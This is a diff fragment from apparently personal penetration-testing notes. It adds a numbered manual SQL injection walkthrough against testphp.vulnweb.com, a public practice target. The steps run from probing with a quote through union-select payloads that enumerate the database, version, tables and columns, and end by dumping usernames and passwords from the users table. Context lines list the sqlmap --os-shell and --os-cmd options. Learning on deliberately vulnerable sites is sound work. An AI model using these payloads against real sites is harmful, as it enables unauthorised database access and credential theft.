@@ -80,11 +80,16 @@
 * --os-shell
 * --os-cmd
 
-
-
-
-
-
+# Manually 
+1. http://testphp.vulnweb.com/
+2. http://testphp.vulnweb.com/listproducts.php?cat=1'           ( we use malicious payload )
+3. http://testphp.vulnweb.com/listproducts.php?cat=1 order by 11--+
+4. http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,7,8,9,10,11--+
+5. http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+
+6. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,7,8,version(),10,11--+
+7. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,table_name,8,version(),10,11 from information_schema.tables--+
+8. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,column_name,8,version(),10,11 from information_schema.columns where table_name="users"--+
+9. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,group_concat(uname,pass),8,version(),10,11 from users--+
 
 
 
